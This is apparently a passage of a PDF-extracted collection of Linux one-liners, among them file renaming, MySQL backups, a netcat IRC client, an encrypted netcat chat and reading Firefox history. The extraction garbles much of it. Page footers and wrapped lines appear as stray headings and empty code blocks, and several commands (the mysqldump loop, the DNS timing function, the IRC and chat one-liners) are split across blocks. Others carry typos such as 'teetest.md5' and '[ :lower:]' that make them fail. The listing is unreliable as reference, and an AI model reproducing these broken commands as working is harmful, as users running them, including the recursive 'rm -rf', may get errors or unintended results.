### Create several copies of a file
``` linux
$ for i in {1..5}; do cp test{,$i};done
```
### Search for a single file and go to it
``` linux
$ cd $(dirname $(find ~ -name emails.txt))
```
### Nice info browser
``` linux
$ pinfo
```
### Sends your internal IP by email
``` linux
$ ifconfig en1 | awk '/inet / {print $2}' | mail -s "hello world" email@email.com
```
### Download schedule
``` linux
$ echo 'wget url' | at 12:00
```
### Use mtr to create a text file report
``` linux
$ mtr --report --report-cycles 10 www.google.com > google_net_report.txt
```
### Quick screenshot
``` linux
$ import -pause 5 -window root desktop_screenshot.jpg
```
### Edit the last or previous command line in an editor then execute
``` linux
$ fc [history-number]
```
### Quicker move to parent directory
``` linux
$ alias ..='cd ..'
```
### Show webcam output
``` linux
$ mplayer tv:// -tv driver=v4l:width=352:height=288
```
### Open the last file you edited in Vim.
``` linux
$ alias lvim="vim -c \"normal '0\""
```
### Keep from having to adjust your volume constantly
``` linux
$ find . -iname \*.mp3 -print0 | xargs -0 mp3gain -krd 6 && vorbisgain -rfs .
```
### [re]verify a disc with very friendly output
``` linux
$ dd if=/dev/cdrom | pv -s 700m | md5sum | teetest.md5
```
### Processes by CPU usage
``` linux
$ ps -e -o pcpu,cpu, nice,state,cputime,args --sort pcpu | sed "/^ 0.0 /d"
```
### 94 | P a g e
```
### TechCircleRotate a set of photos matching their EXIF data.
``` linux
$ jhead -autorot *.jpg
```
### Awk using multiple field separators
``` linux
$ awk -F "=| "
```
### Shows size of dirs and files, hidden or not, sorted.
``` linux
$ du -cs * .[^\.]* | sort -n
```
### Hard disk information - Model/serial no.
``` linux
$ hdparm -i[I] /dev/sda
```
### Use mplayer to save video streams to a file
``` linux
$ mplayer -dumpstream -dumpfile "yourfile" -playlist "URL"
```
### Wrap text files on the command-line for easy reading
``` linux
$ fold -s <filename>
```
### Re-read partition table on specified device without rebooting
```
### system (here /dev/sda).
``` linux
$ blockdev --rereadpt /dev/sda
```
### Get your mac to talk to you
``` linux
$ say -v Vicki "Hi, I'm a mac"
```
### Sort a one-per-line list of email address, weeding out duplicates
``` linux
$ sed 's/[ \t]*$//' < emails.txt | tr 'A-Z' 'a-z' | sort |uniq > emails_ sorted.txt
```
### Recursively change file name from uppercase to lowercase (or
```
### viceversa)
``` linux
$ find . -type f|while read f; do mv $f `echo $f |tr '[:upper:]' '[ :lower:]'`; done
```
### Check the age of the filesystem
``` linux
$ df / | awk '{print $1}' | grep dev | xargs tune2fs -l | grep create
```
### Backup all MySQL Databases to individual files
``` linux
$ for I in `echo "show databases;" | mysql | grep -v Database`; do mysqldump $I >
```
### "$I.sql"; done
```
### Remove all subversion files from a project recursively
``` linux
$ rm -rf `find . -type d -name .svn`
```
### Click on a GUI window and show its process ID and command used
```
### to run the process
``` linux
$ xprop | awk '/PID/ {print $3}' | xargs ps h -o pid,cmd
```
### 95 | P a g e
```
### TechCirclePrint indepth hardware info
``` linux
$ sudo dmidecode | more
```
### Concatenate (join) video files
``` linux
$ mencoder -forceidx -ovc copy -oac copy -o output.avi video1.avi video2.avi
```
### Convert the contents of a directory listing into a colon-separated
```
### environment variable
``` linux
$ find . -name '*.jar' -printf '%f:'
```
### Make a log of a terminal session
``` linux
$ script
```
### Remove invalid host keys from ~/.ssh/known_hosts
``` linux
$ ssh-keygen -R \[localhost\]:8022
```
### Remove all spaces from all files in current folder
``` linux
$ rename 's/ //g' *
```
### A function to find the fastest free DNS server
``` linux
$ timeDNS() { parallel -j0 --tag dig @{} "$*" ::: 208.67.222.222 208.67.220.220
```
### 198.153.192.1 198.153.194.1 156.154.70.1 156.154.71.1 8.8.8.8 8.8.4.4 | grep
```
### Query | sort -nk5; }
```
### New Maintainer for CommandLineFu
``` linux
$ mail tech@commandlinefu.com
```
### Bare Metal IRC Client
``` linux
$ nik=clf$RANDOM;sr=irc.efnet.org;expect -c "set timeout -1;spawn nc $sr 6666;set
```
### send_human {.1 .2 1 .2 1};expect AUTH*
```
### ;send -h \"user $nik * * :$nik commandlinefu
```
### nick $nik
```
### \"; interact -o -re (PING.:)(.*\$) {send \"PONG :\$interact_out(2,string)\"}"
```
### Get your Firefox history
``` linux
$ sqlite3 ~/.mozilla/firefox/*.[dD]efault/places.sqlite "SELECT strftime('%d.%m.%Y
```
### %H:%M:%S', visit_date/1000000, 'unixepoch', 'localtime'),url FROM moz_places,
```
### moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER BY
```
### visit_date;"
```
### Submit command & rewrite orginal command
``` linux
$ <ctrl>+o
```
### Check all bash scripts in current dir for syntax errors
``` linux
$ find . -name '*.sh' -exec bash -n {} \;
```
### 96 | P a g e
```
### TechCircleEncrypted chat with netcat and openssl (one-liner)
``` linux
$ server$ while true; do read -n30 ui; echo $ui |openssl enc -aes-256-ctr -a -k
```
### PaSSw; done | nc -l -p 8877 | while read so; do decoded_so=` echo "$so"| openssl
```
### enc -d -a -aes-256-ctr -k PaSSw`; echo -e "Incoming: $decoded_so"; done
```
### Symlink all files from a base directory to a target directory
``` linux
$ ln -s /BASE/* /TARGET/
```
### List directories only
``` linux
$ ls -d */
```
### 97 | P a g e
```
### TechCircle